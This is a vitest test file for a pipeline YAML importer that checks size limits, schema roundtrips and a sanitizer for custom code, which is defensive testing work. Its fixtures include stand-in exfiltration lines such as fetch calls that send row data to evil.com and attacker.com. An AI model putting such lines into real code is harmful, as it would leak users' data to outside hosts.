import { describe, it, expect } from 'vitest';
import {
  importPipelineFromYaml,
  exportPipelineToYaml,
  sanitizeCustomCode,
  type ParsedPipelineYaml
} from '../pipeline-yaml';
import type { Pipeline } from '../../types/pipeline';

describe('pipeline-yaml security & validation', () => {
  describe('Size Limit', () => {
    it('rejects oversized YAML files (> 100KB)', () => {
      const hugeYaml = 'name: "Huge"\nnodes:\n' + '  - id: n\n'.repeat(12000);
      expect(() => importPipelineFromYaml(hugeYaml)).toThrow('YAML_PAYLOAD_TOO_LARGE');
    });
  });

  describe('Arbitrary Code Sanitization (sanitizeCustomCode)', () => {
    it('neutralizes dangerous tokens in custom code', () => {
      const dangerous = `
        const x = eval('1 + 1');
        require('fs');
        window.location = 'evil.com';
        fetch('https://evil.com/leak');
        return rows;
      `;
      const sanitized = sanitizeCustomCode(dangerous);
      expect(sanitized).not.toContain('eval(');
      expect(sanitized).not.toContain('require(');
      expect(sanitized).not.toContain('window.');
      expect(sanitized).not.toContain('fetch(');
      expect(sanitized).toContain('/* BLOCKED:');
    });

    it('leaves safe transform code intact', () => {
      const safe = `(rows) => rows.map(r => ({ ...r, total: r.qty * r.price }))`;
      const sanitized = sanitizeCustomCode(safe);
      expect(sanitized).toBe(safe);
    });
  });

  describe('Schema Validation & Import', () => {
    it('correctly imports and roundtrips valid YAML', () => {
      const pipeline: Pipeline = {
        id: 'p-1',
        name: 'Test Pipeline',
        status: 'draft',
        nodes: [
          {
            id: 'n1',
            type: 'pipeline-node',
            position: { x: 100, y: 200 },
            data: { label: 'Source', category: 'source', subType: 'csv-upload', configured: true }
          },
          {
            id: 'n2',
            type: 'pipeline-node',
            position: { x: 400, y: 200 },
            data: { label: 'Filter', category: 'transform', subType: 'filter', configured: true }
          }
        ],
        edges: [
          { id: 'e1', source: 'n1', target: 'n2' }
        ],
        createdAt: '2026-01-01',
        updatedAt: '2026-01-01',
        workspaceId: 'ws-1',
        createdBy: 'u-1',
        versions: [],
        currentVersionIndex: 0
      };

      const yaml = exportPipelineToYaml(pipeline);
      const parsed: ParsedPipelineYaml = importPipelineFromYaml(yaml);

      expect(parsed.name).toBe('Test Pipeline');
      expect(parsed.nodes).toHaveLength(2);
      expect(parsed.edges).toHaveLength(1);
      expect(parsed.edges[0].source).toBe('n1');
      expect(parsed.edges[0].target).toBe('n2');
    });

    it('sanitizes embedded malicious code in imported node configs', () => {
      const yaml = `
name: "Malicious Pipeline"
nodes:
  - id: "bad-node"
    label: "Evil Code"
    category: transform
    subType: custom-code
    config:
      code: "fetch('https://attacker.com/steal?data=' + JSON.stringify(rows))"
edges: []
`;
      const parsed = importPipelineFromYaml(yaml);
      const code = parsed.nodes[0].data.config?.code;
      expect(code).not.toContain('fetch(');
      expect(code).toContain('/* BLOCKED: fetch */');
    });
  });
});
